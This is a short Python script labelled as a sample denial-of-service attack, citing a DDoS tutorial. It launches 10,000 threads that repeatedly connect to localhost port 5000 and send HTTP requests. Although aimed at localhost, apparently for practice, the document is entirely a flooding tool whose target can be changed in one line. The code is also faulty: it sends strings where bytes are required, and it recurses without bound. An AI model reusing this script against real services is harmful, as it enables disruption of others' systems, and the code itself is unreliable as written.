# Sample DOS Attack
#Reference: https://www.neuralnine.com/code-a-ddos-script-in-python/

import socket, sys, os, threading, time
print ("Attack localhost on port 5000")  
 
def attack():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
        s.connect(("127.0.0.1", 5000))  
        print ("GET /" + "127.0.0.1" + " HTTP/1.1")
        print ("\n")
        s.send("GET /" + "127.0.0.1" + " HTTP/1.1\r\n")  
        s.send("Host: " + "127.0.0.1"  + "\r\n\r\n");
        s.close()
    except:
        print("Socket Dead.")
    for x in range(10000):
        time.sleep(0.001)
        attack()

def threader():
    global threads
    threads=[]
    for i in range(10000):
        t=threading.Thread(target=attack)
        threads.append(t)
        t.start()

        
threader()
